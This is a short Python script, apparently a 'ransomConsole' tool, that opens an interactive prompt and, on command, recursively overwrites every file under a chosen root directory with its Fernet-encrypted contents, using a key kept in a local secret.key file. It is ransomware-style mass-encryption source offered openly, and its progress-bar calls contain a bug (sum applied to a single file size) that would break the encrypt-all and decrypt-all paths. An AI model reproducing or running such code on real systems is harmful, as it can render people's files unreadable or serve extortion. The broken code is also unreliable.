#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
from rich.progress import track
import time,sys
from tqdm import tqdm
for i in track(range(100),description='Loading program...'):time.sleep(.03)
CMDS=['version','encrypt.all','decrypt.all','encrypt.dir','decrypt.dir','exit']
VER='0.0.3-Pro remake'
KEY_PATH='secret.key'
EXCLUDED=['console.py','console',KEY_PATH,'ransomConsole-0.0.2-Pro.tar.gz','Makefile']
if not os.path.exists(KEY_PATH):
	key=Fernet.generate_key()
	with open(KEY_PATH,'wb')as f:f.write(key)
else:
	with open(KEY_PATH,'rb')as f:key=f.read()
def encrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).encrypt(C))
	print(f"Encrypted {A}")
def encryptAll(rootDir):
	for(B,E,C)in os.walk(rootDir):
		for D in C:
			A=os.path.join(B,D)
			with tqdm(total=sum(os.path.getsize(A)),unit='B',unit_scale=True,desc='Encrypting'):encrypt(A)
def decrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as B:C=B.read()
		with open(A,'wb')as B:B.write(Fernet(key).decrypt(C))
	print(f"Decrypted {A}")
def decryptAll(rootDir):
	for(B,E,C)in os.walk(rootDir):
		for D in C:
			A=os.path.join(B,D)
			with tqdm(total=sum(os.path.getsize(A)),unit='B',unit_scale=True,desc='Decrypting'):decrypt(A)
def main():
	C=input('Enter your root directory: ')or'.'
	while True:
		A=input('Enter your command: ')
		if A==CMDS[0]:print(VER)
		elif A==CMDS[1]:encryptAll(C)
		elif A==CMDS[2]:decryptAll(C)
		elif A==CMDS[3]:
			for B in os.listdir():encrypt(B)
		elif A==CMDS[4]:
			for B in os.listdir():decrypt(B)
		elif A==CMDS[5]:sys.exit(0)
		else:
			print('Error: command not found. Try with:')
			for D in CMDS:print(D)
if __name__=='__main__':main()